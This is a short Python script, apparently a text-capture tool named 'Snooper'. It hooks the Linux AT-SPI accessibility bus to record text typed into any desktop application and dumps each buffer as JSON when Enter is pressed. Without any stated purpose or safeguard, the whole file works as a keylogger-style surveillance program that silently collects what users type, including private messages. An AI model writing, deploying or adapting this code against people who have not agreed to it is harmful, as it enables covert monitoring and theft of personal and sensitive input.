import json
import pyatspi
import time

class Snooper:
    def __init__(self):
        self.text_buffers = {}
        self.start_times = {}

        pyatspi.Registry.registerEventListener(self.on_text_insert, "object:text-changed:insert")
        pyatspi.Registry.registerKeystrokeListener(self.on_key_press, mask=0, kind=(pyatspi.KEY_PRESSED_EVENT,))

    def start(self):
         pyatspi.Registry.start()

    def flush_buffer(self, key):
        source_name, source_role, detail, event_type = key
        if key not in self.text_buffers:
            return

        text = self.text_buffers[key]
        if not text:
            return

        start_time = self.start_times.get(key, time.time())
        duration = time.time() - start_time

        event_info = {
            "source_name": source_name,
            "source_role": source_role,
            "event_type": event_type,
            "text_entered": text,
            "timestamp": start_time,
            "duration": duration
        }
        json_data = json.dumps(event_info, indent=4)
        print(json_data)

        self.text_buffers[key] = ""
        if key in self.start_times:
            del self.start_times[key]

    def on_text_insert(self, event):
        source_name = event.source.name if event.source.name else "unknown"
        event_type = str(event.type)
        key = (source_name, str(event.source_role), str(event.detail2), event_type)

        if hasattr(event, 'any_data'):
            if key not in self.text_buffers:
                self.text_buffers[key] = ""
                self.start_times[key] = time.time()

            self.text_buffers[key] += event.any_data

    def on_key_press(self, event):
        if event.event_string == "Return" or event.hw_code == 36:
            for key in list(self.text_buffers.keys()):
                self.flush_buffer(key)
            self.text_buffers.clear()

def main():
    snooper = Snooper()
    snooper.start()

if __name__ == "__main__":
    main()

